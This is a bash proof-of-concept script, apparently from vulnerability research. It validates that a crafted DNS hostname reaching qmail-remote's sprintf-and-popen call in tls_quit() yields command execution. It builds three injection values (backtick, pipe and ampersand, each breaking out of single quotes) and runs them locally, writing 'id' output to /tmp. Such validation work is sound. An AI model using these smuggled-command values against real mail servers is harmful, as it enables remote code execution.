#!/bin/bash
# Link 2 validation: Prove that the crafted partner_fqdn causes command execution
# when passed through sprintf into popen.
#
# Simulates what qmail-remote.c tls_quit() does:
#   sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", info->pw_dir, partner_fqdn);
#   fp = popen(acfcommand, "r");

# Clean up from prior runs
rm -f /tmp/qmail_rce_proof

# Test 1: Backtick injection via single-quote break
# DNS label bytes would be: x'`id>/tmp/qmail_rce_proof`'y  
# After dn_expand (backtick and single-quote preserved):
PARTNER_FQDN="x'\`id>/tmp/qmail_rce_proof\`'y.example.com"

PW_DIR="/var/qmail"

# This is exactly what the C code does:
ACFCOMMAND="/bin/touch ${PW_DIR}/control/notlshosts/'${PARTNER_FQDN}'"

echo "=== Shell command being executed ==="
echo "$ACFCOMMAND"
echo ""

# Execute via sh -c (equivalent to popen)
sh -c "$ACFCOMMAND" 2>/dev/null

echo "=== Checking for command execution evidence ==="
if [ -f /tmp/qmail_rce_proof ]; then
    echo "SUCCESS: Command injection confirmed!"
    echo "Contents of /tmp/qmail_rce_proof:"
    cat /tmp/qmail_rce_proof
else
    echo "Test 1 failed, trying pipe injection..."
fi

echo ""

# Test 2: Pipe injection via single-quote break
# DNS label bytes would be: a'|id>/tmp/qmail_rce_proof2|echo+'
rm -f /tmp/qmail_rce_proof2
PARTNER_FQDN2="a'|id>/tmp/qmail_rce_proof2|echo+'b.example.com"
ACFCOMMAND2="/bin/touch ${PW_DIR}/control/notlshosts/'${PARTNER_FQDN2}'"

echo "=== Test 2: Pipe injection ==="
echo "$ACFCOMMAND2"
sh -c "$ACFCOMMAND2" 2>/dev/null

if [ -f /tmp/qmail_rce_proof2 ]; then
    echo "SUCCESS: Pipe injection confirmed!"
    echo "Contents:"
    cat /tmp/qmail_rce_proof2
else
    echo "Pipe injection test failed"
fi

echo ""

# Test 3: Ampersand background execution
rm -f /tmp/qmail_rce_proof3
PARTNER_FQDN3="a'&id>/tmp/qmail_rce_proof3&echo+'b.example.com"
ACFCOMMAND3="/bin/touch ${PW_DIR}/control/notlshosts/'${PARTNER_FQDN3}'"

echo "=== Test 3: Ampersand injection ==="
echo "$ACFCOMMAND3"
sh -c "$ACFCOMMAND3" 2>/dev/null
sleep 1

if [ -f /tmp/qmail_rce_proof3 ]; then
    echo "SUCCESS: Ampersand injection confirmed!"
    echo "Contents:"
    cat /tmp/qmail_rce_proof3
else
    echo "Ampersand test failed"
fi
